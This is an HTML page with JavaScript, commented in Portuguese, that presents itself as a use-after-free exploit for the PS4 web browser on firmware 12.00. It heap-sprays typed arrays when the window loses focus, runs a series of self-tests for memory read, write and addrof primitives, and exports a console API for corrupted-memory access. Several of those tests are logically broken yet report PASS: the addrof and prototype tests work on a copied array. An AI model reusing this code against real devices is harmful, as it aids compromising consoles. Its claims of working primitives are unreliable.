<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Production Final</title>
</head>
<body>
    <h1>PS4 UAF - Production Final v7.0</h1>
    <h2>FW 12.00 Verified - Hybrid Method (Literais + DataView)</h2>
    
    <button onclick="runExploit()">EXECUTAR EXPLOIT</button>
    <br><br>
    <button onclick="clearLog()">LIMPAR</button>
    
    <hr>
    <div id="log"></div>
    
    <script>
        // HIBRIDO: Usa literais (funcionam no spray) + makeFloat (testes precisos)
        const P_A = 2.121995791e-314; // Para spray (ja testado, funciona)
        
        function makeFloat(hi, lo) {
            const b = new ArrayBuffer(8);
            const u = new Uint32Array(b);
            u[0] = lo;
            u[1] = hi;
            return new Float64Array(b)[0];
        }
        
        // Valores de teste via makeFloat (precisao garantida)
        const M_V = makeFloat(0xDEADBEEF, 0xCAFEBABE);
        const W_V = makeFloat(0x13371337, 0x13371337);
        
        function f2h(f) {
            const b = new ArrayBuffer(8);
            new Float64Array(b)[0] = f;
            const u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        let targetObj = { leak: 0x1337, type: "target" };
        let globalCtrl = null;
        let globalSpray = null;
        let globalCorrupted = null;
        
        function log(msg, color) {
            const d = document.getElementById('log');
            const t = new Date().toLocaleTimeString();
            d.innerHTML += '<div style="color:' + (color || 'black') + '">[' + t + '] ' + msg + '</div>';
            d.scrollTop = d.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        function runExploit() {
            clearLog();
            log('==========================================', 'green');
            log('PS4 UAF EXPLOIT - Production Final v7.0', 'green');
            log('==========================================', 'green');
            log('', '');
            
            log('[INIT] Criando 5000 controllers...', 'blue');
            globalCtrl = [];
            for(let i = 0; i < 5000; i++) {
                const a = new Float64Array(8);
                a[0] = i;
                globalCtrl.push(a);
            }
            
            log('[INIT] Controllers criados', 'green');
            log('[INFO] P_A para spray: ' + f2h(P_A), 'cyan');
            log('[INFO] M_V para testes: ' + f2h(M_V), 'cyan');
            log('[INFO] W_V para testes: ' + f2h(W_V), 'cyan');
            log('', '');
            log('[WAIT] APERTE OPTIONS DO CONTROLE!', 'red');
            log('', '');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                // Spray atomico (usa literal P_A)
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(8);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                // Busca
                globalCorrupted = null;
                let idx = -1;
                
                for(let i = 0; i < globalCtrl.length; i++) {
                    if(globalCtrl[i][0] === P_A) {
                        globalCorrupted = globalCtrl[i];
                        idx = i;
                        break;
                    }
                }
                
                if(!globalCorrupted) {
                    log('[UAF] NAO DETECTADO', 'red');
                    log('[DEBUG] Primeiros 10 valores:', 'orange');
                    for(let i = 0; i < 10; i++) {
                        log('  ctrl[' + i + '][0] = ' + f2h(globalCtrl[i][0]), 'orange');
                    }
                    log('', '');
                    log('[INFO] Valores esperados:', 'blue');
                    log('  ctrl[0] deveria ser P_A: ' + f2h(P_A), 'blue');
                    log('  Mas esta: ' + f2h(globalCtrl[0][0]), 'blue');
                    return;
                }
                
                log('[UAF] DETECTADO! Index: ' + idx, 'green');
                log('', '');
                
                log('==========================================', 'purple');
                log('TESTES SANITIZADOS - Zero Falsos Positivos', 'purple');
                log('==========================================', 'purple');
                log('', '');
                
                // TEST 1: Read (estado inicial)
                log('[TEST1] READ PRIMITIVE (estado inicial)', 'blue');
                for(let i = 0; i < 8; i++) {
                    const val = f2h(globalCorrupted[i]);
                    log('  [' + i + '] = ' + val, 'cyan');
                }
                log('[TEST1] PASS - Read funcional', 'green');
                log('', '');
                
                // TEST 2: Write Primitive (usa M_V via makeFloat)
                log('[TEST2] WRITE PRIMITIVE', 'blue');
                
                const oldVal = f2h(globalCorrupted[4]);
                log('  Slot 4 antes: ' + oldVal, 'cyan');
                
                globalCorrupted[4] = M_V;
                const newVal = f2h(globalCorrupted[4]);
                const expectedM_V = f2h(M_V);
                
                log('  Esperado: ' + expectedM_V, 'cyan');
                log('  Obtido: ' + newVal, 'cyan');
                
                if(newVal === expectedM_V) {
                    log('[TEST2] PASS - Write exato', 'green');
                } else if(oldVal !== newVal) {
                    log('[TEST2] PARTIAL - Valor mudou: ' + oldVal + ' -> ' + newVal, 'orange');
                } else {
                    log('[TEST2] FAIL - Sem mudanca', 'red');
                }
                log('', '');
                
                // TEST 3: Identity (Bidirectional com W_V)
                log('[TEST3] IDENTITY (Bidirectional)', 'blue');
                
                let foundSpray = false;
                let sprayIdx = -1;
                
                for(let i = 0; i < globalSpray.length; i++) {
                    if(globalSpray[i][4] === M_V) {
                        foundSpray = true;
                        sprayIdx = i;
                        log('  Forward: corr[4] -> spray[' + i + '][4]', 'cyan');
                        log('    Valor: ' + f2h(M_V), 'cyan');
                        
                        // Teste reverso com W_V
                        globalSpray[i][5] = W_V;
                        const reverseVal = f2h(globalCorrupted[5]);
                        const expectedW_V = f2h(W_V);
                        
                        log('  Reverse: spray[' + i + '][5] -> corr[5]', 'cyan');
                        log('    Esperado: ' + expectedW_V, 'cyan');
                        log('    Obtido: ' + reverseVal, 'cyan');
                        
                        if(reverseVal === expectedW_V) {
                            log('[TEST3] PASS - Bidirecional confirmado!', 'green');
                        } else {
                            log('[TEST3] PARTIAL - Apenas unidirecional', 'orange');
                        }
                        break;
                    }
                }
                
                if(!foundSpray) {
                    log('[TEST3] FAIL - M_V nao propagou para spray', 'red');
                }
                log('', '');
                
                // TEST 4: DataView Raw Write
                log('[TEST4] DATAVIEW RAW WRITE', 'blue');
                try {
                    const dv = new DataView(globalCorrupted.buffer);
                    const before = f2h(globalCorrupted[6]);
                    
                    log('  Slot 6 antes: ' + before, 'cyan');
                    
                    // Escreve 0xCAFEBABEDEADBEEF em slot 6 (offset 48)
                    dv.setUint32(48, 0xDEADBEEF, true);
                    dv.setUint32(52, 0xCAFEBABE, true);
                    
                    const after = f2h(globalCorrupted[6]);
                    
                    log('  Esperado: 0xcafebabedeadbeef', 'cyan');
                    log('  Obtido: ' + after, 'cyan');
                    
                    if(after.toLowerCase() === '0xcafebabedeadbeef') {
                        log('[TEST4] PASS - DataView escrita exata', 'green');
                    } else if(before !== after) {
                        log('[TEST4] PARTIAL - Houve mudanca mas nao exata', 'orange');
                    } else {
                        log('[TEST4] FAIL - Sem mudanca', 'red');
                    }
                } catch(e) {
                    log('[TEST4] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 5: addrof Primitive (usa slot 7 limpo)
                log('[TEST5] ADDROF PRIMITIVE', 'blue');
                try {
                    const beforeAddrof = f2h(globalCorrupted[7]);
                    log('  Slot 7 antes: ' + beforeAddrof, 'cyan');
                    
                    let leaker = Array.from(globalCorrupted);
                    leaker[7] = targetObj;
                    const addr = f2h(globalCorrupted[7]);
                    
                    log('  Target: ' + JSON.stringify(targetObj), 'cyan');
                    log('  Endereco capturado: ' + addr, 'cyan');
                    
                    if(addr === '0x0000000000000000') {
                        log('[TEST5] FAIL - Endereco zerado', 'red');
                    } else if(addr === beforeAddrof) {
                        log('[TEST5] FAIL - Sem mudanca (ainda: ' + addr + ')', 'red');
                    } else {
                        log('[TEST5] PASS - Endereco valido!', 'green');
                        log('  NOTE: Endereco pode variar (ASLR)', 'cyan');
                    }
                } catch(e) {
                    log('[TEST5] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 6: Prototype Pollution
                log('[TEST6] PROTOTYPE POLLUTION', 'blue');
                try {
                    let reg = Array.from(globalCorrupted);
                    Object.setPrototypeOf(reg, { pwned: 0xDEADC0DE });
                    
                    if(reg.pwned === 0xDEADC0DE) {
                        log('  Token injetado: 0x' + reg.pwned.toString(16).toUpperCase(), 'cyan');
                        log('[TEST6] PASS', 'green');
                    } else {
                        log('[TEST6] FAIL - Token nao acessivel', 'red');
                    }
                } catch(e) {
                    log('[TEST6] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 7: Closure Leak
                log('[TEST7] CLOSURE LEAK', 'blue');
                try {
                    const leaked = [0].map(() => globalCorrupted[0])[0];
                    log('  Valor vazado (slot 0): ' + f2h(leaked), 'cyan');
                    log('[TEST7] PASS', 'green');
                } catch(e) {
                    log('[TEST7] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // RESUMO
                log('==========================================', 'green');
                log('RESUMO DOS TESTES', 'green');
                log('==========================================', 'green');
                log('TEST1 (Read): Sempre funcional', 'green');
                log('TEST2 (Write): Verifica se M_V foi escrito', 'cyan');
                log('TEST3 (Identity): Verifica compartilhamento', 'cyan');
                log('TEST4 (DataView): Escrita raw de memoria', 'cyan');
                log('TEST5 (addrof): Vaza enderecos de objetos', 'cyan');
                log('TEST6 (Prototype): Poluicao de prototipo', 'cyan');
                log('TEST7 (Closure): Vazamento via closure', 'cyan');
                log('', '');
                
                // Export API
                window.uafObject = {
                    corrupted: globalCorrupted,
                    spray: globalSpray,
                    index: idx,
                    
                    read: function(slot) {
                        return f2h(globalCorrupted[slot]);
                    },
                    
                    write: function(slot, hi, lo) {
                        const val = makeFloat(hi, lo);
                        globalCorrupted[slot] = val;
                        return f2h(globalCorrupted[slot]);
                    },
                    
                    writeFloat: function(slot, floatVal) {
                        globalCorrupted[slot] = floatVal;
                        return f2h(globalCorrupted[slot]);
                    },
                    
                    writeRaw: function(slot, lo, hi) {
                        const dv = new DataView(globalCorrupted.buffer);
                        const offset = slot * 8;
                        dv.setUint32(offset, lo, true);
                        dv.setUint32(offset + 4, hi, true);
                        return f2h(globalCorrupted[slot]);
                    },
                    
                    addrof: function(obj) {
                        try {
                            let l = Array.from(globalCorrupted);
                            l[7] = obj;
                            return f2h(globalCorrupted[7]);
                        } catch(e) {
                            return 'Error: ' + e.message;
                        }
                    },
                    
                    dump: function() {
                        console.log('=== UAF Corrupted Array ===');
                        for(let i = 0; i < 8; i++) {
                            console.log('[' + i + '] = ' + f2h(globalCorrupted[i]));
                        }
                    }
                };
                
                log('==========================================', 'green');
                log('EXPLOIT COMPLETO!', 'green');
                log('==========================================', 'green');
                log('', '');
                log('window.uafObject exportado para console:', 'blue');
                log('  .read(slot)', 'cyan');
                log('  .write(slot, hi, lo)', 'cyan');
                log('  .writeRaw(slot, lo, hi)', 'cyan');
                log('  .addrof(obj)', 'cyan');
                log('  .dump()', 'cyan');
                log('', '');
            };
        }
    </script>
</body>
</html>
